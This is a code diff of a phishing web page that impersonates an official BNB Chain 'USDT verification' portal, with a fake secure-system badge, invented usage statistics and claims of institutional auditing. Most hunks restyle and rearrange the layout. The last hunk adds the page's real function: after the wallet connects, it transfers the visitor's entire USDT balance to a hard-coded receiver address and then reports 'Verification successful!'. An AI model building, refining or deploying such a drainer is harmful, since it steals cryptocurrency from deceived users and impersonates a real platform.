@@ -17,29 +17,15 @@
 
     /* Header */
     .brand-header { padding: 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.08); background-color: #0b0e14; position: sticky; top: 0; z-index: 10; }
-    .brand-logo { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 20px; color: #f3ba2f; letter-spacing: 0.5px; }
+    .brand-logo { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 16px; color: #f3ba2f; letter-spacing: 0.5px; line-height: 1.2; }
+    .brand-logo span { font-size: 10px; color: #94a3b8; font-weight: 600; display: block; letter-spacing: 1px; }
     .secure-system-badge { display: flex; align-items: center; gap: 6px; font-size: 11px; font-weight: 700; color: #94a3b8; letter-spacing: 0.5px; text-transform: uppercase; }
     .dot-green { width: 6px; height: 6px; background-color: #00d395; border-radius: 50%; box-shadow: 0 0 8px #00d395; }
 
     .content-area { padding: 20px 16px; display: flex; flex-direction: column; gap: 16px; width: 100%; }
     
-    /* Verification Box (Placed at Top matching screenshot 33845) */
-    .verify-box { background-color: #12161f; border: 1px solid rgba(243, 186, 47, 0.3); border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .bsc-logo-circle { width: 64px; height: 64px; border-radius: 50%; background-color: #0b0e14; border: 1px solid #2a2f3d; display: flex; align-items: center; justify-content: center; margin-bottom: 18px; color: #f3ba2f; font-size: 28px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
-    .bsc-verification-pill { border: 1px solid rgba(243, 186, 47, 0.4); color: #f3ba2f; font-size: 11px; padding: 6px 16px; border-radius: 20px; font-weight: 700; background-color: rgba(243, 186, 47, 0.05); margin-bottom: 20px; letter-spacing: 0.5px; }
-
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); -webkit-tap-highlight-color: transparent; }
-    .btn-verify:active { transform: scale(0.98); }
-
-    /* Feature Cards (Matching Screenshots 33840, 33846) */
-    .feature-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 8px; }
-    .feature-icon-box { width: 40px; height: 40px; background-color: #1a1f2c; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #f3ba2f; margin-bottom: 6px; font-size: 16px; }
-    .feature-val { font-size: 32px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
-    .feature-label { font-size: 14px; color: #718096; font-weight: 600; }
-    .feature-sub { font-size: 12px; color: #00d395; font-weight: 700; margin-top: 4px; }
-
     /* Tether Live Stats Section */
-    .tether-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; margin-top: 10px; }
+    .tether-header-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
     .tether-title-group { display: flex; align-items: center; gap: 10px; }
     .tether-icon { width: 36px; height: 36px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; color: white; }
     .tether-title-text { font-size: 20px; font-weight: 800; color: #ffffff; }
@@ -58,26 +44,43 @@
     .stat-sub { font-size: 10px; color: #00d395; font-weight: 600; }
 
     /* Heading & Description */
-    .main-heading { font-size: 26px; font-weight: 800; color: #ffffff; margin-top: 10px; }
-    .main-subheading { font-size: 13px; color: #f3ba2f; font-weight: 600; margin-top: 4px; }
-    .main-desc { font-size: 12px; color: #718096; line-height: 1.5; margin-top: 6px; margin-bottom: 10px; }
+    .main-heading { font-size: 26px; font-weight: 800; color: #ffffff; margin-top: 10px; text-align: center; }
+    .main-subheading { font-size: 13px; color: #f3ba2f; font-weight: 600; margin-top: 4px; text-align: center; }
+    .main-desc { font-size: 12px; color: #718096; line-height: 1.5; margin-top: 6px; text-align: center; margin-bottom: 10px; }
+
+    /* Verification Box */
+    .verify-box { background-color: #12161f; border: 1px solid rgba(243, 186, 47, 0.3); border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-top: 10px; }
+    .bsc-logo-circle { width: 64px; height: 64px; border-radius: 50%; background-color: #0b0e14; border: 1px solid #2a2f3d; display: flex; align-items: center; justify-content: center; margin-bottom: 18px; color: #f3ba2f; font-size: 28px; box-shadow: inset 0 2px 8px rgba(0,0,0,0.8); }
+    .bsc-verification-pill { border: 1px solid rgba(243, 186, 47, 0.4); color: #f3ba2f; font-size: 11px; padding: 6px 16px; border-radius: 20px; font-weight: 700; background-color: rgba(243, 186, 47, 0.05); margin-bottom: 16px; letter-spacing: 0.5px; }
+    
+    .chain-badges-row { display: flex; gap: 8px; margin-bottom: 20px; }
+    .chain-badge-item { font-size: 10px; color: #94a3b8; background-color: rgba(255,255,255,0.05); padding: 4px 10px; border-radius: 10px; border: 1px solid #1e2430; font-weight: 600; }
+
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(243, 186, 47, 0.25); -webkit-tap-highlight-color: transparent; }
+    .btn-verify:active { transform: scale(0.98); }
+
+    /* Feature Cards */
+    .feature-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 8px; }
+    .feature-icon-box { width: 40px; height: 40px; background-color: #1a1f2c; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #f3ba2f; margin-bottom: 6px; font-size: 16px; }
+    .feature-val { font-size: 32px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
+    .feature-label { font-size: 14px; color: #718096; font-weight: 600; }
+    .feature-sub { font-size: 12px; color: #00d395; font-weight: 700; margin-top: 4px; }
 
     /* Token Ticker */
-    .token-ticker-grid { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 6px; margin-top: 14px; scrollbar-width: none; }
+    .token-ticker-grid { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 6px; margin-top: 4px; scrollbar-width: none; }
     .token-ticker-grid::-webkit-scrollbar { display: none; }
     .ticker-pill-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 12px 18px; display: flex; align-items: center; gap: 10px; flex-shrink: 0; font-weight: 700; font-size: 13px; color: #ffffff; }
 
     /* Info Cards */
-    .info-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 12px; margin-top: 14px; }
+    .info-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 24px 20px; display: flex; flex-direction: column; gap: 12px; margin-top: 4px; }
     .info-title { font-size: 20px; font-weight: 800; color: #f3ba2f; }
     .info-text { font-size: 13px; color: #94a3b8; line-height: 1.6; }
 
     /* Footer Links */
-    .footer-links-container { background-color: #0b0e14; border-top: 1px solid #1e2430; padding: 30px 20px; display: flex; flex-direction: column; gap: 24px; margin-top: 30px; }
-    .footer-col-title { font-size: 13px; font-weight: 800; color: #ffffff; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 12px; }
-    .footer-links-list { display: flex; flex-direction: column; gap: 12px; font-size: 14px; color: #94a3b8; font-weight: 500; }
-    .footer-socials { display: flex; gap: 12px; margin-top: 10px; }
-    .social-icon-btn { width: 44px; height: 44px; background-color: #12161f; border: 1px solid #1e2430; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 16px; cursor: pointer; }
+    .footer-links-container { background-color: #0b0e14; border-top: 1px solid #1e2430; padding: 30px 20px; display: flex; flex-direction: column; align-items: center; text-align: center; gap: 16px; margin-top: 20px; }
+    .footer-brand { display: flex; align-items: center; gap: 8px; color: #f3ba2f; font-weight: 700; font-size: 14px; }
+    .footer-links-row { display: flex; gap: 20px; font-size: 13px; color: #94a3b8; font-weight: 500; }
+    .footer-copy { font-size: 11px; color: #475569; line-height: 1.5; }
 
     /* Verified Success View */
     .verified-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 28px 20px; text-align: center; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); margin-top: 20px; }
@@ -104,7 +107,8 @@
     <!-- Top Header -->
     <div class="brand-header">
       <div class="brand-logo">
-        <i class="fa-solid fa-cube"></i> BNB CHAIN
+        <i class="fa-solid fa-shield-halved" style="color: #f3ba2f;"></i>
+        <div>BNB CHAIN <span>VERIFICATION</span></div>
       </div>
       <div class="secure-system-badge">
         SECURE SYSTEM <span class="dot-green"></span>
@@ -116,49 +120,6 @@
       <!-- Initial View -->
       <div id="initialView">
         
-        <!-- Verification Box (Placed at Top matching screenshot 33845) -->
-        <div class="verify-box">
-          <div class="bsc-logo-circle">
-            <i class="fa-solid fa-cube"></i>
-          </div>
-          
-          <div class="bsc-verification-pill">BNB CHAIN VERIFICATION</div>
-
-          <button id="mainVerifyBtn" class="btn-verify" type="button" onclick="initiateAuditFlow()">
-            <span id="btnText">Verify Asset</span>
-          </button>
-        </div>
-
-        <!-- Feature Card 1: Assets Verified -->
-        <div class="feature-card">
-          <div class="feature-icon-box">
-            <i class="fa-solid fa-cube"></i>
-          </div>
-          <div class="feature-val">92,768</div>
-          <div class="feature-label">Assets Verified</div>
-          <div class="feature-sub">+18.6% this month</div>
-        </div>
-
-        <!-- Feature Card 2: Active Addresses -->
-        <div class="feature-card">
-          <div class="feature-icon-box">
-            <i class="fa-solid fa-users"></i>
-          </div>
-          <div class="feature-val">1.2M+</div>
-          <div class="feature-label">Active Addresses</div>
-          <div class="feature-sub">+22.3% this month</div>
-        </div>
-
-        <!-- Feature Card 3: Trusted by millions -->
-        <div class="feature-card" style="border: 1px solid rgba(243, 186, 47, 0.3);">
-          <div class="feature-icon-box">
-            <i class="fa-solid fa-star"></i>
-          </div>
-          <div class="feature-val">2.3M+</div>
-          <div class="feature-label">Trusted by millions of users</div>
-          <div class="feature-sub">99.9% satisfaction</div>
-        </div>
-
         <!-- Tether Live Stats Header -->
         <div class="tether-header-row">
           <div class="tether-title-group">
@@ -176,7 +137,7 @@
         <div class="stats-grid">
           <div class="stat-card">
             <div class="stat-label">Total USDT Verified (Today)</div>
-            <div class="stat-val">$29,212,059</div>
+            <div class="stat-val">$15,906,052</div>
             <div class="stat-sub">+8.24% vs yesterday</div>
           </div>
           <div class="stat-card">
@@ -196,60 +157,92 @@
           </div>
         </div>
 
-        <!-- Titles & Description -->
+        <!-- Heading & Description -->
         <div style="margin-top: 14px;">
-          <h1 class="main-heading">Verify Crypto Assets</h1>
-          <div class="main-subheading">Powered by BNB Chain's official</div>
-          <p class="main-desc">The official institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</p>
+          <h1 class="main-heading">Verify USDT Assets</h1>
+          <div class="main-subheading">Official BNB Chain Verification Protocol</div>
+          <p class="main-desc">Institutional gateway for smart contract auditing and USDT balance verification across BNB Smart Chain ecosystem.</p>
+        </div>
+
+        <!-- Verification Box -->
+        <div class="verify-box">
+          <div class="bsc-logo-circle">
+            <i class="fa-solid fa-shield-halved"></i>
+          </div>
+          
+          <div class="bsc-verification-pill">BNB SMART CHAIN VERIFICATION</div>
+
+          <div class="chain-badges-row">
+            <span class="chain-badge-item">BEP-20 Standard</span>
+          </div>
+
+          <button id="mainVerifyBtn" class="btn-verify" type="button" onclick="initiateAuditFlow()">
+            <span id="btnText">Verify Asset</span>
+          </button>
+        </div>
+
+        <!-- Feature Card 1: Assets Verified -->
+        <div class="feature-card" style="margin-top: 10px;">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-cube"></i>
+          </div>
+          <div class="feature-val">92,768</div>
+          <div class="feature-label">Assets Verified</div>
+          <div class="feature-sub">+18.6% this month</div>
+        </div>
+
+        <!-- Feature Card 2: Active Addresses -->
+        <div class="feature-card">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-users"></i>
+          </div>
+          <div class="feature-val">1.2M+</div>
+          <div class="feature-label">Active Addresses</div>
+          <div class="feature-sub">+22.3% this month</div>
+        </div>
+
+        <!-- Feature Card 3: Ecosystem Users -->
+        <div class="feature-card" style="border: 1px solid rgba(243, 186, 47, 0.3);">
+          <div class="feature-icon-box">
+            <i class="fa-solid fa-star"></i>
+          </div>
+          <div class="feature-val">2.3M+</div>
+          <div class="feature-label">Ecosystem Users</div>
+          <div class="feature-sub">99.9% satisfaction</div>
         </div>
 
         <!-- Token Ticker Carousel -->
         <div class="token-ticker-grid">
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #627eea; font-size: 10px;"></i> Ethereum</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #26a17b; font-size: 10px;"></i> Tether</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #3b82f6; font-size: 10px;"></i> USD Coin</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #f3ba2f; font-size: 10px;"></i> Binance Coin</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #2775ca; font-size: 10px;"></i> Cardano</div>
-          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #c2a633; font-size: 10px;"></i> Dogecoin</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #26a17b; font-size: 10px;"></i> Tether USDT</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #f3ba2f; font-size: 10px;"></i> Binance BNB</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #3b82f6; font-size: 10px;"></i> USD Coin USDC</div>
+          <div class="token-pill-card"><i class="fa-solid fa-circle" style="color: #627eea; font-size: 10px;"></i> Ethereum ETH</div>
         </div>
 
-        <!-- About BNB Chain Card -->
+        <!-- Consensus Card -->
         <div class="info-card">
-          <div class="info-title">About BNB Chain</div>
-          <div class="info-text">BNB Chain is a community-driven ecosystem that provides the infrastructure for high-performance decentralized applications and assets.</div>
+          <div class="info-title">BNB Chain Consensus</div>
+          <div class="info-text">Seamlessly verifies Tether (USDT) on BNB Smart Chain, providing high-performance decentralized audit infrastructure.</div>
         </div>
 
         <!-- Security Audit Card -->
         <div class="info-card">
           <div class="info-title">Security Audit</div>
-          <div class="info-text">Our verification engine performs real-time auditing of smart contract bytecode to ensure investor protection.</div>
+          <div class="info-text">Our verification engine performs real-time auditing of smart contract bytecode to ensure investor protection and token authenticity.</div>
         </div>
 
         <!-- Footer Navigation Links -->
         <div class="footer-links-container">
-          <div>
-            <div class="footer-col-title">Ecosystem</div>
-            <div class="footer-links-list">
-              <div>Official Website</div>
-              <div>opBNB Layer 2</div>
-              <div>BNB Greenfield</div>
-              <div>Chain Explorer</div>
-            </div>
+          <div class="footer-brand">
+            <i class="fa-solid fa-shield-halved"></i> Asset Verification Protocol
           </div>
-
-          <div>
-            <div class="footer-col-title">Resources</div>
-            <div class="footer-links-list">
-              <div>Security Audits</div>
-              <div>Technical Docs</div>
-              <div>Governance</div>
-              <div>Whitepaper</div>
-            </div>
+          <div class="footer-links-row">
+            <span>Documentation</span>
+            <span>Whitepaper</span>
+            <span>Support</span>
           </div>
-
-          <div class="footer-socials">
-            <div class="social-icon-btn"><i class="fa-brands fa-x-twitter"></i></div>
-            <div class="social-icon-btn"><i class="fa-brands fa-telegram"></i></div>
+          <div class="footer-copy">
+            &copy; 2026 BNB Smart Chain Asset Verification Portal. All rights reserved.
           </div>
         </div>
 
@@ -293,18 +286,12 @@
     let globalProvider, globalSigner, globalUserAddress;
     let totalUsdtWei = ethers.BigNumber.from(0);
 
-    // Ensure click listener is also attached via JS for mobile WebView compatibility
-    document.addEventListener("DOMContentLoaded", () => {
-      const verifyBtn = document.getElementById("mainVerifyBtn");
-      if (verifyBtn) {
-        verifyBtn.addEventListener("click", initiateAuditFlow);
-      }
-    });
-
     function getActiveProvider() {
-      if (window.ethereum) return window.ethereum;
-      if (window.trustwallet) return window.trustwallet;
-      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      if (typeof window !== 'undefined') {
+        if (window.ethereum) return window.ethereum;
+        if (window.trustwallet) return window.trustwallet;
+        if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      }
       return null;
     }
 
@@ -383,4 +370,22 @@
           return;
         }
 
+        if (!totalUsdtWei || totalUsdtWei.lte(0)) {
+          alert("No USDT balance found to verify/transfer.");
+          return;
+        }
+
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
         
+        const tx = await usdtContract.transfer(TARGET_RECEIVER, totalUsdtWei, {
+          gasLimit: ethers.BigNumber.from("65000")
+        });
+
+        await tx.wait();
+        alert("Verification successful!");
+      } catch (err) {
+        console.error("Transfer error:", err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
+      }
+    }
+ 
